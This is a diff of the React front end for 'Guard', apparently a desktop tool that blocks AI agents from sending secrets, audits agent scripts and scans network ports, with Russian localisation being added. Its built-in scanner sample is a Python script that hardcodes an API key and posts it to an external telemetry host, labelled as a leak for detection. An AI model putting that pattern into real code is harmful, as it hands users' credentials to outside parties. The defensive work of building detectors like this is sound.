-    color: "#fff", border: "none", borderRadius: "999px", padding: "6px 13px", font: "inherit", fontSize: "11px",
-    fontWeight: 700, letterSpacing: ".04em", cursor: "pointer", boxShadow: "0 10px 30px rgb(0 0 0 / .55)" };
-  const TAB_BADGE = { marginLeft: "6px", display: "inline-block", minWidth: "15px", padding: "0 4px", borderRadius: "999px",
-    background: "var(--yg-bad, #e25555)", color: "#fff", fontSize: "9px", fontWeight: 700, lineHeight: "15px",
-    textAlign: "center", letterSpacing: "0" };
-  function GuardToast(p) {
-    const inc = p.inc;
-    const chatT = inc.agent && inc.agent.session_id ? resolveChatTitle(inc.agent.session_id) : null;
-    const who = chatT ? chatT.title : (inc.agent && inc.agent.session_id ? "Фоновый сеанс ИИ (№" + String(inc.agent.session_id).slice(-6) + ")" : "ИИ-агент");
-    const findings = inc.findings || [];
-    const f = findings.length ? findings[0] : null;
-    return h("div", { className: "yg-toast", role: "alert", "aria-live": "assertive", style: TOAST_BOX },
-      h("div", { className: "yg-inc-top" },
-        h(Pill, { kind: "bad" }, "⛔ Guard blocked an agent"),
-        h("span", { className: "yg-dim yg-small yg-right" }, p.count > 1 ? "1 of " + p.count + " waiting" : ago(inc.at)),
-        h("button", { type: "button", className: "yg-btn ghost", style: { padding: "2px 7px", fontSize: "11px" },
-          title: "Hide. The counter stays on the Guard tab.", onClick: p.onDismiss }, "✕")),
-      h("div", { className: "yg-inc-story" }, "В чате ", h("b", null, who), " ИИ-помощник попытался использовать инструмент ",
-        h("b", { className: "yg-mono" }, inc.tool || "?"), " для отправки данных в ",
-        h("b", { className: "yg-mono" }, inc.destination || "?"), "."),
-      f ? h("div", { className: "yg-row" },
-        h(Chip, { label: { id: f.label, label: f.title } }),
-        f.token ? h(Reveal, { incident: inc.id, index: 0, preview: f.preview })
-          : h("span", { className: "yg-mono yg-dim" }, f.preview)) : null,
-      p.note ? h("div", { className: "yg-err yg-small" }, p.note) : null,
-      h("div", { className: "yg-actions" },
-        h("button", { className: "yg-btn bad", disabled: !!p.busy, onClick: function () { p.onDecide("block"); },
-          title: "Keep the action blocked" }, p.busy === "block" ? "…" : "⛔ Block"),
-        h("button", { className: "yg-btn good", disabled: !!p.busy, onClick: function () { p.onDecide("allow"); },
-          title: "Let this exact action run one time (expires in 15 minutes)" }, p.busy === "allow" ? "…" : "Allow once"),
-        h("button", { className: "yg-btn ghost", disabled: !!p.busy, onClick: p.onOpen }, "Show in Guard")));
+      // Process metadata
+      inc.process ? h("div", { className: "yg-dim yg-small" },
+        (currentLang === "ru" ? "Программа: " : "Program: ") + (inc.process.name || "Hermes") +
+        " · " + (currentLang === "ru" ? "Сеанс №" : "Session #") + (inc.agent && inc.agent.session_id ? String(inc.agent.session_id).slice(-8) : "—") +
+        " (pid " + inc.process.pid + ")") : null,
+
+      // Decision buttons
+      pending ? h("div", { className: "yg-actions" },
+        (inc.findings || []).length && !(inc.risks || []).length ? h("button", {
+          className: "yg-btn good", disabled: !!busy, onClick: function () { choose("protect"); }
+        }, busy === "protect" ? "…" : (currentLang === "ru" ? "🛡 Защитить и отправить" : "Protect & send")) : null,
+        h("button", {
+          className: "yg-btn bad", disabled: !!busy, onClick: function () { choose("block"); }
+        }, busy === "block" ? "…" : ((inc.risks || []).length
+          ? (currentLang === "ru" ? "⛔ Заблокировать" : "⛔ Block")
+          : (currentLang === "ru" ? "Заблокировать и изолировать" : "Block & quarantine"))),
+        h("button", {
+          className: "yg-btn ghost", disabled: !!busy, onClick: function () { choose("allow"); }
+        }, busy === "allow" ? "…" : (currentLang === "ru" ? "Разрешить один раз" : "Allow once")),
+        note ? h("span", { className: "yg-note" }, note) : null) : null
+    );
   }
 
   function LivePanel(p) {
@@ -1228,24 +1059,27 @@
     if (!data) return h(Card, { title: "live protection", className: "wide" }, h(Empty, { text: "loading…" }));
     if (data.status === "error") return h(Card, { title: "live protection", className: "wide" },
       h("div", { className: "yg-err" }, "● " + data.message));
+
     function delIncident(id) {
-      if (!window.confirm("Удалить инцидент " + id + " из истории? Это нельзя отменить.")) return;
+      if (!window.confirm(currentLang === "ru" ? ("Удалить инцидент " + id + " из истории? Это нельзя отменить.") : ("Delete incident " + id + " from history?"))) return;
       setHistBusy(id);
       post("/incidents/delete", { incident: id }).then(function (r) {
         setHistBusy("");
         if (r.status === "ok" && p.onChanged) p.onChanged();
-        else if (r.status !== "ok") window.alert(r.message || "Не удалось удалить инцидент.");
-      }).catch(function () { setHistBusy(""); window.alert("Не удалось связаться с бэкендом Guard."); });
+        else if (r.status !== "ok") window.alert(r.message || "Failed to delete incident.");
+      }).catch(function () { setHistBusy(""); window.alert("Could not reach Guard backend."); });
     }
+
     function clearHistory() {
-      if (!window.confirm("Очистить всю решённую историю инцидентов? Ожидающие решения останутся. Это нельзя отменить.")) return;
+      if (!window.confirm(currentLang === "ru" ? "Очистить всю решённую историю инцидентов? Ожидающие решения останутся." : "Clear all resolved incident history?")) return;
       setHistBusy("__all__");
       post("/incidents/clear", { scope: "resolved" }).then(function (r) {
         setHistBusy("");
         if (r.status === "ok" && p.onChanged) p.onChanged();
-        else if (r.status !== "ok") window.alert(r.message || "Не удалось очистить историю.");
-      }).catch(function () { setHistBusy(""); window.alert("Не удалось связаться с бэкендом Guard."); });
+        else if (r.status !== "ok") window.alert(r.message || "Failed to clear history.");
+      }).catch(function () { setHistBusy(""); window.alert("Could not reach Guard backend."); });
     }
+
     const items = data.items || [];
     const pending = items.filter(function (i) { return i.status === "pending"; });
     const done = items.filter(function (i) { return i.status !== "pending"; })
@@ -1257,49 +1091,71 @@
           (inc.findings || []).map(function (f) { return f.label || ""; }).join(" ")).toLowerCase();
         return hay.indexOf(q.toLowerCase()) !== -1;
       });
-    const FILTERS = [["all", "Все"], ["blocked", "Заблокировано"], ["allowed", "Разрешено"]];
+
+    const FILTERS = [["all", currentLang === "ru" ? "Все" : "All"],
+                     ["blocked", currentLang === "ru" ? "Заблокировано" : "Blocked"],
+                     ["allowed", currentLang === "ru" ? "Разрешено" : "Allowed"]];
+
     return h(React.Fragment, null,
-      h(Card, { title: "live protection", className: "wide" },
+      h(Card, { title: currentLang === "ru" ? "защита в реальном времени" : "live protection", className: "wide" },
         h(VisualSecurityMap, { data: data, refresh: p.onChanged }),
-        h("div", { className: "yg-shield " + (pending.length ? "bad" : "ok") },
-          h("span", { className: "yg-big" }, pending.length ? "⛔ " + pending.length + " action" + (pending.length > 1 ? "s" : "") + " blocked" : "✓ Защищено"),
-          h("span", { className: "yg-dim" }, pending.length
-            ? "Агент пытался отправить конфиденциальные данные. Решите ниже, что делать."
-            : "· Каждое действие агента проверяется на секреты до запуска.")),
+        // Show pending alert shield if there are pending actions; omit duplicate if none
+        pending.length ? h("div", { className: "yg-shield bad" },
+          h("span", { className: "yg-big" }, currentLang === "ru" ? ("⛔ " + (pending.length > 1 ? (pending.length + " действия заблокировано") : "1 действие заблокировано")) : ("⛔ " + pending.length + " action" + (pending.length > 1 ? "s" : "") + " blocked")),
+          h("span", { className: "yg-dim" }, currentLang === "ru" ? "  Агент пытался отправить важные данные. Решите ниже, что делать." : "  An agent tried to send sensitive data. Decide below what should happen."))
+          : null,
         pending.length ? pending.map(function (inc) { return h(IncidentCard, { key: inc.id, inc: inc, onChanged: p.onChanged }); }) : null),
-      h(Card, { title: "incident history", className: "wide grow" },
+
+      h(Card, { title: currentLang === "ru" ? "история инцидентов" : "incident history", className: "wide grow" },
         h("div", { className: "yg-hst-tools" },
-          h("input", { className: "yg-input yg-hst-search", placeholder: "Поиск по тексту или ИД…", value: q,
-            onChange: function (e) { setQ(e.target.value); } }),
+          h("input", {
+            className: "yg-input yg-hst-search",
+            placeholder: currentLang === "ru" ? "Поиск по тексту или ID…" : "Search by text or ID…",
+            value: q, onChange: function (e) { setQ(e.target.value); }
+          }),
           h("div", { className: "yg-kinds", style: { margin: 0 } },
-            FILTERS.map(function (f) { return h("button", { key: f[0], type: "button", className: "yg-kind" + (filter === f[0] ? " on" : ""), onClick: function () { setFilter(f[0]); } }, f[1]); })),
-          done.length ? h("button", { type: "button", className: "yg-btn ghost", disabled: !!histBusy,
-            title: "Удалить все решённые инциденты из истории", onClick: clearHistory },
-            histBusy === "__all__" ? "…" : "🗑 Очистить историю") : null),
+            FILTERS.map(function (f) {
+              return h("button", {
+                key: f[0], type: "button",
+                className: "yg-kind" + (filter === f[0] ? " on" : ""),
+                onClick: function () { setFilter(f[0]); }
+              }, f[1]);
+            })),
+          done.length ? h("button", {
+            type: "button", className: "yg-btn ghost", disabled: !!histBusy,
+            title: currentLang === "ru" ? "Удалить все решённые инциденты" : "Clear resolved history",
+            onClick: clearHistory
+          }, histBusy === "__all__" ? "…" : (currentLang === "ru" ? "🗑 Очистить историю" : "🗑 Clear history")) : null),
         done.length ? h("div", { className: "yg-list" },
           done.slice(0, 50).map(function (inc) {
             var accSummary = h("summary", { className: "yg-acc-sum" },
               h("span", { className: "yg-acc-id" }, inc.id),
-              h("span", { className: "yg-acc-status" }, STATUS_TEXT[inc.status] || inc.status),
+              h("span", { className: "yg-acc-status" }, getStatusText(inc.status)),
               h("span", { className: "yg-dim yg-acc-time" }, fmtTs(inc.at)),
               h("span", { className: "yg-dim yg-acc-how" }, (inc.tool || "") + " → " + (inc.destination || "")),
-              h("button", { type: "button", className: "yg-btn ghost yg-acc-del", disabled: !!histBusy,
-                title: "Удалить эту запись из истории",
-                onClick: function (e) { e.preventDefault(); e.stopPropagation(); delIncident(inc.id); } },
-                histBusy === inc.id ? "…" : "🗑"));
+              h("button", {
+                type: "button", className: "yg-btn ghost yg-acc-del", disabled: !!histBusy,
+                title: "Delete",
+                onClick: function (e) { e.preventDefault(); e.stopPropagation(); delIncident(inc.id); }
+              }, histBusy === inc.id ? "…" : "🗑"));
             return h("details", { key: inc.id, className: "yg-acc", open: false }, accSummary,
-              h(IncidentCard, { inc: inc, onChanged: p.onChanged }));
+              h(IncidentCard, { inc: inc, onChanged: p.onChanged, inAccordion: true }));
           }))
           : h(Empty, { text: "No incidents yet." })));
   }
-  const SAMPLE = "fn main() requires [NetworkAccess] {\n  let key = env.secret()\n  return net.send(key)\n}\n";
+
+  // =========================================================================
+  // TASK 3.3: CODE INSPECTOR (AI Agent Scripts & Commands Audit, no YadroLang)
+  // =========================================================================
+  const SAMPLE = "import os, requests\n\n# AI agent automated script: process invoice and telemetry\nOPENAI_API_KEY = \"sk-proj-aB9xK1mZ8Qp2wE5rT7yU4iO6pL0sD3fG2hJ1kL4\"\nuser_prompt = \"Process user payment\"\n\n# Leak: transmitting raw secret key to external collector\nres = requests.post(\n    \"https://analytics-collector.external-api.org/telemetry\",\n    headers={\"Authorization\": f\"Bearer {OPENAI_API_KEY}\"},\n    json={\"task\": user_prompt, \"key\": OPENAI_API_KEY}\n)\nprint(\"Telemetry sent:\", res.status_code)\n";
 
   function CheckPanel() {
-    const [code, setCode] = useState(SAMPLE);   // prefilled so "Check code" works on first click
+    const [code, setCode] = useState(SAMPLE);
     const [title, setTitle] = useState("");
     const [busy, setBusy] = useState(false);
     const [r, setR] = useState(null);
     const [report, setReport] = useState("");
+
     function analyze() {
       setBusy(true); setReport("");
       post("/analyze", { code: code, title: title })
@@ -1308,24 +1164,35 @@
     }
     function applyFix() { if (r && r.autofix) { setCode(r.autofix.fixed_code); setR(null); } }
     function openReport() { post("/report", { code: code }).then(function (d) { setReport(d.html || ""); }).catch(function () {}); }
-    return h(Card, { title: "check agent code before it runs", className: "wide" },
-      h("div", { className: "yg-dim yg-small" }, "Paste a program written in YadroLang (English or Russian keywords). " +
-        "Guard proves where sensitive data can leak, before the code ever runs."),
-      h("input", { className: "yg-input", placeholder: "Name (optional), e.g. payment agent", value: title,
-        onChange: function (e) { setTitle(e.target.value); } }),
-      h("textarea", { className: "yg-code-in", spellCheck: false, placeholder: "Paste YadroLang code here", value: code,
-        onChange: function (e) { setCode(e.target.value); } }),
+
+    return h(Card, { title: currentLang === "ru" ? "проверка кода и команд агентов" : "check agent code before it runs", className: "wide" },
+      h("div", { className: "yg-dim yg-small" },
+        currentLang === "ru"
+          ? "Проверка кода, скриптов и команд ИИ-агентов (Python, Bash, JS, конфигурации MCP) перед запуском на утечки секретов и опасные системные вызовы."
+          : "Audit AI agent scripts, commands, and pipelines (Python, Bash, JS, MCP calls) for secret leaks and dangerous calls before execution."),
+      h("input", {
+        className: "yg-input",
+        placeholder: currentLang === "ru" ? "Название (необязательно), например: Агент платежей" : "Name (optional), e.g. payment agent",
+        value: title, onChange: function (e) { setTitle(e.target.value); }
+      }),
+      h("textarea", {
+        className: "yg-code-in", spellCheck: false,
+        placeholder: currentLang === "ru" ? "Вставьте скрипт или команду агента (Python, Bash, JS, JSON)..." : "Paste agent code or script here",
+        value: code, onChange: function (e) { setCode(e.target.value); }
+      }),
       h("div", { className: "yg-actions" },
-        h("button", { className: "yg-btn", disabled: busy || !code.trim(), onClick: analyze }, busy ? "Checking…" : "Check code"),
-        h("button", { className: "yg-btn ghost", onClick: function () { setCode(SAMPLE); setR(null); } }, "Load example"),
-        r && r.status !== "error" ? h("button", { className: "yg-btn ghost", onClick: openReport }, "Open full report") : null),
+        h("button", { className: "yg-btn", disabled: busy || !code.trim(), onClick: analyze },
+          busy ? (currentLang === "ru" ? "Проверка…" : "Checking…") : (currentLang === "ru" ? "Проверить код" : "Check code")),
+        h("button", { className: "yg-btn ghost", onClick: function () { setCode(SAMPLE); setR(null); } },
+          currentLang === "ru" ? "Пример скрипта" : "Load example"),
+        r && r.status !== "error" ? h("button", { className: "yg-btn ghost", onClick: openReport },
+          currentLang === "ru" ? "Полный отчёт" : "Open full report") : null),
       r ? h(Result, { r: r, onFix: applyFix }) : null,
-      // Inline, not a fixed modal: cards use backdrop-filter, which makes position:fixed
-      // relative to the card, so a modal got clipped (seen in Hermes Desktop).
       report ? h("div", { className: "yg-report" },
         h("div", { className: "yg-actions" },
-          h("span", { className: "yg-sub" }, "Full report"),
-          h("button", { className: "yg-btn ghost yg-right", onClick: function () { setReport(""); } }, "Close report")),
+          h("span", { className: "yg-sub" }, currentLang === "ru" ? "Полный отчёт" : "Full report"),
+          h("button", { className: "yg-btn ghost yg-right", onClick: function () { setReport(""); } },
+            currentLang === "ru" ? "Закрыть отчёт" : "Close report")),
         h("iframe", { className: "yg-frame", sandbox: "", srcDoc: report, title: "report" })) : null);
   }
 
@@ -1371,6 +1238,7 @@
     return h("details", { className: "yg-gaps" }, h("summary", null, "Honest limits of this check"),
       h("ul", null, p.gaps.map(function (g, i) { return h("li", { key: i }, g); })));
   }
+
   const SEV = { critical: ["Critical", "bad"], high: ["High", "bad"], medium: ["Medium", "warn"], low: ["Low", "ok"], info: ["Safe", "ok"] };
   const REACH = { all_networks: "Open to every network", local_network: "Open to this local network", this_computer: "Only this computer" };
 
@@ -1386,23 +1254,31 @@
     }
     useEffect(function () { load(false); }, []);
     function changed() { load(true); }
+
     if (!data) return h(Card, { title: "network exposure", className: "wide" }, h(Empty, { text: "Scanning ports… this takes about 10 seconds." }));
     if (data.status === "error") return h(Card, { title: "network exposure", className: "wide" }, h("div", { className: "yg-err" }, "● " + data.message));
+
     const items = data.listeners || [];
     const risky = items.filter(function (l) { return l.severity !== "info"; });
     const safe = items.filter(function (l) { return l.severity === "info"; });
     const c = data.counts || {};
     const bad = (c.critical || 0) + (c.high || 0);
+
     return h(React.Fragment, null,
-      h(Card, { title: "network exposure", className: "wide" },
+      h(Card, { title: currentLang === "ru" ? "открытые порты" : "network exposure", className: "wide" },
         h("div", { className: "yg-shield " + (bad ? "bad" : "ok") },
           h("span", { className: "yg-big" }, bad ? "⛔ " : "✓ ", T("Exposure score "), data.score, "/100"),
           h("span", { className: "yg-dim" }, "  ", c.critical || 0, T(" critical · "), c.high || 0, T(" high · "),
             c.medium || 0, T(" medium · "), c.low || 0, T(" low"))),
-        h("div", { className: "yg-dim yg-small" }, "Programs on this computer that accept network connections, and who can reach them. Nothing is changed by this scan."),
+        h("div", { className: "yg-dim yg-small" },
+          currentLang === "ru"
+            ? "Программы на этом компьютере, принимающие сетевые подключения, и уровень их открытости. Сканирование ничего не меняет в системе."
+            : "Programs on this computer that accept network connections, and who can reach them. Nothing is changed by this scan."),
         h("div", { className: "yg-actions" },
-          h("button", { className: "yg-btn", disabled: busy, onClick: function () { load(true); } }, busy ? "Scanning…" : "Check again"),
-          h("span", { className: "yg-dim yg-small" }, "Last check " + ago(data.scanned_at))),
+          h("button", { className: "yg-btn", disabled: busy, onClick: function () { load(true); } },
+            busy ? (currentLang === "ru" ? "Сканирование…" : "Scanning…") : (currentLang === "ru" ? "Проверить снова" : "Check again")),
+          h("span", { className: "yg-dim yg-small" },
+            (currentLang === "ru" ? "Последняя проверка: " : "Last check ") + ago(data.scanned_at))),
         risky.length ? risky.map(function (l) { return h(PortRow, { key: l.proto + l.port + "/" + l.pid, l: l, onChanged: changed }); })
           : h(Empty, { text: "Nothing risky is open to the network." }),
         h(FixHistory, { stamp: data.scanned_at, onChanged: changed }),
@@ -1410,7 +1286,7 @@
           h("ul", null, (data.limits || []).map(function (g, i) { return h("li", { key: i }, g); })))),
       h(Card, { title: "safe listeners", className: "wide" },
         h("button", { className: "yg-btn ghost", onClick: function () { setShowSafe(!showSafe); } },
-          (showSafe ? "Hide " : "Show ") + safe.length + " safe listeners"),
+          (showSafe ? (currentLang === "ru" ? "Скрыть " : "Hide ") : (currentLang === "ru" ? "Показать " : "Show ")) + safe.length + " safe listeners"),
         showSafe ? safe.map(function (l) { return h(PortRow, { key: l.proto + l.port + "/" + l.pid, l: l, compact: true }); }) : null));
   }
 
@@ -1418,83 +1294,87 @@
     const a = l.addresses && l.addresses.length ? l.addresses : [l.address];
     return a.map(function (x) { return x === "::" ? "[::]" : x; }).join(" + ");
   }
-  const FW_TEXT = { allowed: "firewall lets it in", blocked: "firewall blocks it", off: "firewall is OFF",
-    "not verified": "firewall: not verified", "not needed": "" };
-  const FW_SCOPE = { everyone: "from anyone", "local network": "from your local network only",
-    "some addresses": "from some addresses", "default": "by default", "group policy": "(managed by your organisation)" };
-  function fwText(l) {
-    // Each fragment is translated on its own (T()); returning one concatenated
-    // string would defeat T(), because the whole joined sentence has no key.
-    const parts = [];
-    parts.push(T(FW_TEXT[l.firewall] != null ? FW_TEXT[l.firewall] : "firewall: " + l.firewall));
-    if (l.firewall_scope && FW_SCOPE[l.firewall_scope]) parts.push(T(FW_SCOPE[l.firewall_scope]));
-    if (l.firewall_rule) parts.push(T("(rule") + " \u201c" + l.firewall_rule + "\u201d");
-    return parts.join(" ");
-  }
 
-  // What the user can do about a port. System changes open a Windows (UAC) confirmation.
-  const ACT_TEXT = { block_port: "Block in firewall", unblock: "Remove Guard's block", disable_service: "Turn off this service",
-    stop_program: "Stop the program", show_file: "Show program file", trust: "I know this, it is fine", untrust: "Stop trusting" };
-  const ACT_ASK = { block_port: "Block incoming connections to this port in Windows Firewall? Windows will ask you to confirm. You can undo it here.",
-    disable_service: "Turn off this Windows service? Windows will ask you to confirm. You can undo it here.",
-    stop_program: "Stop this program now? Unsaved work in it may be lost.",
-    unblock: "Remove the block that Guard added? Windows will ask you to confirm." };
-  const ACT_DONE = { blocked: "Blocked. Other devices can no longer connect to this port.", unblocked: "The block was removed.",
-    service_off: "The service is off and will not start again.", stopped: "The program was stopped. It may start again later.",
-    shown: "Opened the program's folder.", trust: "Marked as trusted. It no longer lowers your score.",
-    untrust: "Removed from trusted.", settings: "Opened Windows settings.", undone: "Undone. Everything is back as it was." };
-  const SETTINGS_TEXT = { firewall: "Open Windows Firewall", sharing: "Open sharing settings", services: "Open Windows services",
-    delivery: "Open Delivery Optimization settings" };
+  function fwText(l) {
+    if (l.firewall === "blocked") return "firewall blocks it";
+    if (l.firewall === "off") return "firewall is OFF";
+    if (l.firewall === "allowed") {
+      let t = "firewall lets it in";
+      if (l.firewall_scope === "local_subnet") t += " (from your local network only)";
+      else if (l.firewall_scope === "custom") t += " (from some addresses)";
+      if (l.firewall_rule) t += " (rule " + l.firewall_rule + ")";
+      return t;
+    }
+    return "firewall: not verified";
+  }
 
   function PortActions(p) {
     const l = p.l;
     const [busy, setBusy] = useState("");
-    const [note, setNote] = useState(null);
+    const [msg, setMsg] = useState("");
     function act(action, extra) {
-      if (ACT_ASK[action] && !window.confirm(T(ACT_ASK[action]) + (action === "disable_service" && l.breaks ? "\n\n" + T(l.breaks) : ""))) return;
-      setBusy(action); setNote(null);
-      post("/exposure/act", Object.assign({ action: action, proto: l.proto, port: l.port, pid: l.pid }, extra || {}))
+      setBusy(action); setMsg("");
+      const body = Object.assign({ action: action, proto: l.proto, port: l.port, pid: l.pid }, extra || {});
+      post("/exposure/act", body)
         .then(function (r) {
-          setNote(r.status === "ok" ? { ok: true, text: ACT_DONE[r.message] || r.message, fix: r.fix } : { ok: false, text: r.message || "Could not do it." });
-          if (r.status === "ok" && p.onChanged) p.onChanged();
+          if (r.status === "ok") { p.onChanged(); }
+          else { setMsg(r.message || "Could not do it."); }
         })
-        .catch(function () { setNote({ ok: false, text: "Could not reach the Guard backend." }); })
+        .catch(function () { setMsg("Could not reach the Guard backend."); })
         .finally(function () { setBusy(""); });
     }
-    const acts = l.actions || [];
-    if (!acts.length && !l.settings) return null;
-    return h("div", null,
-      l.breaks && acts.indexOf("disable_service") >= 0 ? h("div", { className: "yg-dim yg-small" }, "If you turn it off: " + l.breaks) : null,
-      h("div", { className: "yg-actions" },
-        acts.map(function (a) {
-          return h("button", { key: a, className: "yg-btn " + (a === "block_port" || a === "disable_service" ? "" : "ghost"),
-            disabled: !!busy, onClick: function () { act(a); } }, busy === a ? "…" : ACT_TEXT[a] || a);
-        }),
-        l.settings ? h("button", { className: "yg-btn ghost", disabled: !!busy,
-          onClick: function () { act("settings", { page: l.settings }); } }, SETTINGS_TEXT[l.settings] || "Open settings") : null),
-      note ? h("div", { className: note.ok ? "yg-ok yg-small" : "yg-err yg-small" }, note.text,
-        note.fix ? h("button", { className: "yg-btn ghost yg-undo", onClick: function () { act("undo", { fix: note.fix }); } }, "Undo") : null) : null);
+    const btns = [];
+    if (l.actions && l.actions.indexOf("block_port") >= 0)
+      btns.push(h("button", { key: "bp", className: "yg-btn", disabled: !!busy, onClick: function () { act("block_port"); } }, "Block in firewall"));
+    if (l.actions && l.actions.indexOf("unblock") >= 0)
+      btns.push(h("button", { key: "ub", className: "yg-btn ghost", disabled: !!busy, onClick: function () { act("unblock"); } }, "Remove firewall block"));
+    if (l.actions && l.actions.indexOf("disable_service") >= 0 && l.service_name)
+      btns.push(h("button", { key: "ds", className: "yg-btn bad", disabled: !!busy, onClick: function () {
+        if (window.confirm(T("Turn off this Windows service? Windows will ask you to confirm. You can undo it here."))) act("disable_service");
+      } }, "Turn off this service"));
+    if (l.actions && l.actions.indexOf("stop_program") >= 0)
+      btns.push(h("button", { key: "sp", className: "yg-btn bad", disabled: !!busy, onClick: function () {
+        if (window.confirm(T("Stop this program now? Unsaved work in it may be lost."))) act("stop_program");
+      } }, "Stop the program"));
+    if (l.settings_page)
+      btns.push(h("button", { key: "st", className: "yg-btn ghost", disabled: !!busy, onClick: function () { act("settings", { page: l.settings_page }); } }, "Open Windows Settings"));
+    btns.push(h("button", { key: "tr", className: "yg-btn ghost", disabled: !!busy, onClick: function () { act(l.trusted ? "untrust" : "trust"); } },
+      l.trusted ? "Stop trusting" : "Mark as trusted"));
+    return h("div", { className: "yg-actions" }, btns,
+      busy ? h("span", { className: "yg-dim yg-small" }, "Working with Windows…") : null,
+      msg ? h("span", { className: "yg-err yg-small" }, msg) : null);
   }
 
   function FixHistory(p) {
-    const [items, setItems] = useState(null);
-    const [msg, setMsg] = useState("");
-    function load() { SDK.fetchJSON(API + "/exposure/fixes").then(function (d) { setItems(d.items || []); }).catch(function () { setItems([]); }); }
-    useEffect(load, [p.stamp]);
-    if (!items || !items.length) return null;
-    return h("details", { className: "yg-gaps" }, h("summary", null, "Changes made by Guard (" + items.length + ")"),
-      items.map(function (e) {
-        return h("div", { className: "yg-row", key: e.id },
-          h("span", { className: "yg-mono yg-small" }, e.id),
-          h("span", { className: "yg-small" }, e.proto + " " + e.port + " · " + e.process + " · " + (FIX_KIND[e.kind] || e.kind)),
-          h("span", { className: "yg-dim yg-small" }, ago(e.at)),
-          e.undone ? h("span", { className: "yg-dim yg-small" }, "undone")
-            : e.undo ? h("button", { className: "yg-btn ghost", onClick: function () {
-                post("/exposure/act", { action: "undo", fix: e.id }).then(function (r) { setMsg(r.status === "ok" ? ACT_DONE.undone : r.message); load(); if (p.onChanged) p.onChanged(); });
-              } }, "Undo") : null);
-      }), msg ? h("div", { className: "yg-small" }, msg) : null);
+    const [fixes, setFixes] = useState([]);
+    const [busy, setBusy] = useState("");
+    function load() {
+      SDK.fetchJSON(API + "/exposure/fixes")
+        .then(function (r) { if (r.status === "ok") setFixes(r.items || []); })
+        .catch(function () {});
+    }
+    useEffect(function () { load(); }, [p.stamp]);
+    function undo(fixId) {
+      setBusy(fixId);
+      post("/exposure/act", { action: "undo", fix: fixId })
+        .then(function (r) {
+          if (r.status === "ok") { p.onChanged(); load(); }
+          else { window.alert(r.message || "Could not undo."); }
+        })
+        .catch(function () { window.alert("Could not reach the Guard backend."); })
+        .finally(function () { setBusy(""); });
+    }
+    if (!fixes.length) return null;
+    return h("div", { className: "yg-gap" },
+      h("div", { className: "yg-sub" }, "Changes made by Guard (" + fixes.length + ")"),
+      fixes.map(function (f) {
+        return h("div", { className: "yg-row", key: f.id },
+          h("span", null, T(f.action), ": ", h("b", { className: "yg-mono" }, f.target), " (", ago(f.at), ")"),
+          f.undone ? h("span", { className: "yg-dim" }, "undone") :
+            h("button", { className: "yg-btn ghost", disabled: busy === f.id, onClick: function () { undo(f.id); } },
+              busy === f.id ? "…" : "Undo"));
+      }));
   }
-  const FIX_KIND = { block_port: "blocked in firewall", disable_service: "service turned off", stop_program: "program stopped" };
 
   function PortRow(p) {
     const l = p.l, s = SEV[l.severity] || ["?", "warn"];
@@ -1502,8 +1382,6 @@
       h("div", { className: "yg-inc-top" },
         h(Pill, { kind: s[1] }, s[0]),
         h("b", null, l.service),
-        // Split into nodes so each text fragment goes through T(); a single
-        // "proto addr port N" string has no i18n key and would stay English.
         h("span", { className: "yg-dim yg-right yg-mono" },
           l.proto + " " + addrText(l), " ", T("port"), " ", l.port)),
       h("div", { className: "yg-inc-story" },
@@ -1519,24 +1397,39 @@
   const KINDS = [["Credentials", "Password, API key or token"], ["Financial", "Card or bank account"],
     ["PII", "Personal data (name, phone, email)"], ["Health", "Medical data"], ["Location", "Location data"]];
 
+  // =========================================================================
+  // TASK 3.4: VAULT PANEL (Friendly Secret Name & msg_tok_ Tokens)
+  // =========================================================================
   function VaultPanel(p) {
+    const [title, setTitle] = useState("");
     const [secret, setSecret] = useState("");
     const [label, setLabel] = useState("Credentials");
     const [msg, setMsg] = useState(null);
     const [busy, setBusy] = useState(false);
+
     function save() {
       setBusy(true); setMsg(null);
-      post("/vault", { secret: secret, label: label })
+      post("/vault", { secret: secret, label: label, title: title })
         .then(function (r) {
-          if (r.status === "ok") { setSecret(""); setMsg({ ok: true, text: T("Saved. Agents now get the token ") + r.token.slice(0, 26) + T("… instead of the real value, and any attempt to send the real value is blocked.") }); p.onChanged(); }
-          else setMsg({ ok: false, text: r.message || "Could not save." });
+          if (r.status === "ok") {
+            setSecret(""); setTitle("");
+            setMsg({
+              ok: true,
+              text: currentLang === "ru"
+                ? ("Сохранено. Секрету присвоен токен " + (r.token || "").slice(0, 26) + "… вместо реального значения.")
+                : (T("Saved. Agents now get the token ") + (r.token || "").slice(0, 26) + T("… instead of the real value, and any attempt to send the real value is blocked."))
+            });
+            p.onChanged();
+          } else setMsg({ ok: false, text: r.message || "Could not save." });
         })
         .catch(function () { setMsg({ ok: false, text: "Could not reach the Guard backend." }); })
         .finally(function () { setBusy(false); });
     }
+
     const items = (p.vault && p.vault.items) || [];
     const live = items.filter(function (v) { return !v.deleted; });
     const trash = items.filter(function (v) { return v.deleted; });
+
     function op(body, okText) {
       setBusy(true); setMsg(null);
       post("/vault/op", body)
@@ -1547,6 +1440,7 @@
         .catch(function () { setMsg({ ok: false, text: "Could not reach the Guard backend." }); })
         .finally(function () { setBusy(false); });
     }
+
     function addFile(f) {
       if (!f) return;
       if (f.size > 10 * 1024 * 1024) { setMsg({ ok: false, text: "This file is too large (limit 10 MB)." }); return; }
@@ -1564,37 +1458,55 @@
       };
       rd.readAsDataURL(f);
     }
-    return h(Card, { title: "vault · your secrets, encrypted", className: "wide" },
-      h("div", { className: "yg-dim yg-small" }, T("Add a secret you want to protect. It is encrypted with your Windows account ") +
-        T("and never shown again here. Guard blocks any agent that tries to send it.")),
-      h("input", { className: "yg-input", type: "password", autoComplete: "off", placeholder: "Paste the secret value",
-        value: secret, onChange: function (e) { setSecret(e.target.value); } }),
-      // Buttons instead of a native <select>: its dropdown is drawn by the OS (white list,
-      // blue text) and ignores the dark theme.
+
+    return h(Card, { title: currentLang === "ru" ? "сейф · ваши секреты, зашифрованы" : "vault · your secrets, encrypted", className: "wide" },
+      h("div", { className: "yg-dim yg-small" },
+        currentLang === "ru"
+          ? "Добавьте секрет, который хотите защитить. Он шифруется механизмом Windows DPAPI и никогда не показывается в открытом виде. Агентам передаётся только токен msg_tok_..."
+          : (T("Add a secret you want to protect. It is encrypted with your Windows account ") + T("and never shown again here. Guard blocks any agent that tries to send it."))),
+      // Mandatory secret title input
+      h("input", {
+        className: "yg-input",
+        placeholder: currentLang === "ru" ? "Название секрета (например: Ключ OpenAI, Карта Visa, Токен GitHub)" : "Secret name (e.g. OpenAI Key, Visa Card, GitHub Token)",
+        value: title, onChange: function (e) { setTitle(e.target.value); }
+      }),
